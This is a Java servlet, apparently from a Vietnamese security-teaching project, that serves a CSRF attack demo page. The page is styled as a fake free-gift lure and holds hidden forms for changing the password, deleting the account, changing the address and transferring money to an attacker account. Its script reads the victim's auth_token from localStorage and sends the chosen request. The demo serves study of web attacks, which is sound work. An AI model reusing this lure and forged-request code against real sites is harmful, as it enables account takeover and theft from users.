package web;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

/**
 * Serve CSRF attack demo HTML page từ cùng domain (8443)
 * Để một phía attack và target cùng origin → bypass CORS, test được CSRF
 */
@WebServlet(name = "CSRFDemoPageServlet", urlPatterns = {"/csrf-demo"})
public class CSRFDemoPageServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) 
            throws ServletException, IOException {
        resp.setContentType("text/html; charset=UTF-8");
        resp.setCharacterEncoding("UTF-8");

        String html = "<!DOCTYPE html>\n" +
"<html lang=\"vi\">\n" +
"<head>\n" +
"    <meta charset=\"UTF-8\">\n" +
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n" +
"    <title>Quà Tặng Miễn Phí - Nhấn Vào Để Nhận!</title>\n" +
"    <style>\n" +
"        body {\n" +
"            font-family: Arial, sans-serif;\n" +
"            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n" +
"            display: flex;\n" +
"            justify-content: center;\n" +
"            align-items: center;\n" +
"            height: 100vh;\n" +
"            margin: 0;\n" +
"            padding: 20px;\n" +
"        }\n" +
"        .container {\n" +
"            background: white;\n" +
"            padding: 40px;\n" +
"            border-radius: 10px;\n" +
"            box-shadow: 0 10px 25px rgba(0,0,0,0.2);\n" +
"            max-width: 600px;\n" +
"            text-align: center;\n" +
"        }\n" +
"        h1 { color: #333; margin-bottom: 10px; }\n" +
"        .gift-emoji { font-size: 80px; margin: 20px 0; }\n" +
"        p { color: #666; font-size: 16px; line-height: 1.6; }\n" +
"        .button-container { margin: 30px 0; }\n" +
"        .claim-button {\n" +
"            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n" +
"            color: white;\n" +
"            padding: 15px 40px;\n" +
"            font-size: 18px;\n" +
"            border: none;\n" +
"            border-radius: 5px;\n" +
"            cursor: pointer;\n" +
"            transition: transform 0.2s;\n" +
"        }\n" +
"        .claim-button:hover { transform: scale(1.05); }\n" +
"        .warning-box {\n" +
"            background: #fff3cd;\n" +
"            border: 1px solid #ffc107;\n" +
"            color: #856404;\n" +
"            padding: 15px;\n" +
"            border-radius: 5px;\n" +
"            margin-top: 20px;\n" +
"            font-size: 12px;\n" +
"        }\n" +
"        .hidden-form { display: none; }\n" +
"        .attack-info {\n" +
"            background: #f8d7da;\n" +
"            border: 1px solid #f5c6cb;\n" +
"            color: #721c24;\n" +
"            padding: 20px;\n" +
"            border-radius: 5px;\n" +
"            margin-top: 20px;\n" +
"            text-align: left;\n" +
"        }\n" +
"        code {\n" +
"            background: #f5f5f5;\n" +
"            padding: 10px;\n" +
"            border-radius: 3px;\n" +
"            display: block;\n" +
"            overflow-x: auto;\n" +
"            font-size: 12px;\n" +
"        }\n" +
"        .success-alert {\n" +
"            background: #d4edda;\n" +
"            border: 1px solid #c3e6cb;\n" +
"            color: #155724;\n" +
"            padding: 15px;\n" +
"            border-radius: 5px;\n" +
"            margin-top: 20px;\n" +
"            display: none;\n" +
"        }\n" +
"    </style>\n" +
"</head>\n" +
"<body>\n" +
"    <div class=\"container\">\n" +
"        <h1>🎁 QUÀ TẶNG MIỄN PHÍ CHO BẠN!</h1>\n" +
"        <div class=\"gift-emoji\">🎉</div>\n" +
"        <p>Hãy nhấn nút bên dưới để nhận quà tặng trị giá 5,000,000 VNĐ từ chúng tôi!</p>\n" +
"        <div class=\"button-container\">\n" +
"            <button class=\"claim-button\" onclick=\"claimGift()\">Nhấn Để Nhận Quà (1 Click)</button>\n" +
"        </div>\n" +
"        <div class=\"warning-box\">⚠️ Lời nhắc: Đang đăng nhập vào account bookstore để nhận quà</div>\n" +
"        <div id=\"successAlert\" class=\"success-alert\"><strong>✓ CSRF Attack Success!</strong><br>Request đã gửi. Kiểm tra console.</div>\n" +
"        \n" +
"        <form id=\"csrf-password-form\" class=\"hidden-form\" method=\"POST\" action=\"/api/csrf-demo/change-password\">\n" +
"            <input type=\"hidden\" name=\"newPassword\" value=\"attacker_hacked_password_12345\">\n" +
"            <input type=\"hidden\" name=\"confirmPassword\" value=\"attacker_hacked_password_12345\">\n" +
"        </form>\n" +
"        <form id=\"csrf-delete-form\" class=\"hidden-form\" method=\"POST\" action=\"/api/csrf-demo/delete-account\">\n" +
"            <input type=\"hidden\" name=\"confirm\" value=\"true\">\n" +
"        </form>\n" +
"        <form id=\"csrf-address-form\" class=\"hidden-form\" method=\"POST\" action=\"/api/csrf-demo/update-address\">\n" +
"            <input type=\"hidden\" name=\"address\" value=\"123 Attacker Street\">\n" +
"            <input type=\"hidden\" name=\"city\" value=\"Attacker City\">\n" +
"            <input type=\"hidden\" name=\"country\" value=\"Hacker Land\">\n" +
"        </form>\n" +
"        <form id=\"csrf-money-form\" class=\"hidden-form\" method=\"POST\" action=\"/api/csrf-demo/transfer-money\">\n" +
"            <input type=\"hidden\" name=\"toAccount\" value=\"attacker_account_12345\">\n" +
"            <input type=\"hidden\" name=\"amount\" value=\"1000000\">\n" +
"        </form>\n" +
"        \n" +
"        <div class=\"attack-info\">\n" +
"            <h3>📊 CSRF Attack Demo</h3>\n" +
"            <p><strong>Chọn loại attack:</strong></p>\n" +
"            <div style=\"margin: 15px 0;\">\n" +
"                <label><input type=\"radio\" name=\"attack\" value=\"password\" checked> 🔐 Change Password</label>\n" +
"            </div>\n" +
"            <div style=\"margin: 15px 0;\">\n" +
"                <label><input type=\"radio\" name=\"attack\" value=\"delete\"> ❌ Delete Account</label>\n" +
"            </div>\n" +
"            <div style=\"margin: 15px 0;\">\n" +
"                <label><input type=\"radio\" name=\"attack\" value=\"address\"> 📮 Change Address</label>\n" +
"            </div>\n" +
"            <div style=\"margin: 15px 0;\">\n" +
"                <label><input type=\"radio\" name=\"attack\" value=\"money\"> 💰 Transfer Money</label>\n" +
"            </div>\n" +
"        </div>\n" +
"    </div>\n" +
"\n" +
"    <script>\n" +
"        function claimGift() {\n" +
"            const selectedAttack = document.querySelector('input[name=\"attack\"]:checked').value;\n" +
"            console.log('[CSRF] Attack type: ' + selectedAttack);\n" +
"            \n" +
"            const attackMap = {\n" +
"                'password': 'csrf-password-form',\n" +
"                'delete': 'csrf-delete-form',\n" +
"                'address': 'csrf-address-form',\n" +
"                'money': 'csrf-money-form'\n" +
"            };\n" +
"            \n" +
"            const form = document.getElementById(attackMap[selectedAttack]);\n" +
"            if (!form) {\n" +
"                console.error('[CSRF] Form not found');\n" +
"                return;\n" +
"            }\n" +
"            \n" +
"            const formData = new FormData(form);\n" +
"            const token = localStorage.getItem('auth_token');\n" +
"            console.log('[CSRF] auth_token from localStorage: ' + (token ? token.substring(0, 20) + '...' : 'NOT FOUND'));\n" +
"            console.log('[CSRF] Target URL: ' + form.action);\n" +
"            \n" +
"            if (!token) {\n" +
"                document.getElementById('successAlert').style.display = 'block';\n" +
"                document.getElementById('successAlert').innerHTML = '<strong>✗ ERROR:</strong> No auth_token in localStorage. Please login first.';\n" +
"                document.getElementById('successAlert').style.background = '#f8d7da';\n" +
"                return;\n" +
"            }\n" +
"            \n" +
"            const headers = {'Authorization': 'Bearer ' + token};\n" +
"            \n" +
"            document.getElementById('successAlert').style.display = 'block';\n" +
"            document.getElementById('successAlert').innerHTML = '<strong>⏳ Sending CSRF attack...</strong>';\n" +
"            \n" +
"            fetch(form.action, {\n" +
"                method: 'POST',\n" +
"                body: new URLSearchParams(formData),\n" +
"                headers: headers\n" +
"            }).then(response => {\n" +
"                console.log('[CSRF] Response status: ' + response.status);\n" +
"                return response.json();\n" +
"            }).then(data => {\n" +
"                console.log('[CSRF] Response: ', data);\n" +
"                const alert = document.getElementById('successAlert');\n" +
"                \n" +
"                if (data.error) {\n" +
"                    alert.innerHTML = '<strong>✗ FAILED:</strong> ' + data.error;\n" +
"                    alert.style.background = '#f8d7da';\n" +
"                    alert.style.color = '#721c24';\n" +
"                } else if (data.message) {\n" +
"                    alert.innerHTML = '<strong>✓ CSRF SUCCESS!</strong><br>' + data.message;\n" +
"                    alert.style.background = '#d4edda';\n" +
"                    alert.style.color = '#155724';\n" +
"                } else {\n" +
"                    alert.innerHTML = '<strong>✓ CSRF SUCCESS!</strong><br>Change applied for: ' + selectedAttack;\n" +
"                    alert.style.background = '#d4edda';\n" +
"                    alert.style.color = '#155724';\n" +
"                }\n" +
"            }).catch(error => {\n" +
"                console.error('[CSRF] Network Error: ', error);\n" +
"                const alert = document.getElementById('successAlert');\n" +
"                alert.innerHTML = '<strong>✗ NETWORK ERROR:</strong> ' + error.message;\n" +
"                alert.style.background = '#f8d7da';\n" +
"                alert.style.color = '#721c24';\n" +
"            });\n" +
"        }\n" +
"        \n" +
"        window.addEventListener('load', () => {\n" +
"            const token = localStorage.getItem('auth_token');\n" +
"            console.log('%c⚠️ CSRF DEMO PAGE LOADED ⚠️', 'color: red; font-size: 14px; font-weight: bold;');\n" +
"            console.log('[DEBUG] auth_token in localStorage: ' + (token ? 'YES' : 'NO'));\n" +
"            if (!token) {\n" +
"                document.getElementById('successAlert').style.display = 'block';\n" +
"                document.getElementById('successAlert').innerHTML = '<strong>⚠️ WARNING:</strong> Not logged in! Please go back to login.';\n" +
"                document.getElementById('successAlert').style.background = '#fff3cd';\n" +
"                document.getElementById('successAlert').style.color = '#856404';\n" +
"            }\n" +
"        });\n" +
"    </script>\n" +
"</body>\n" +
"</html>";
        resp.getWriter().write(html);
    }
}
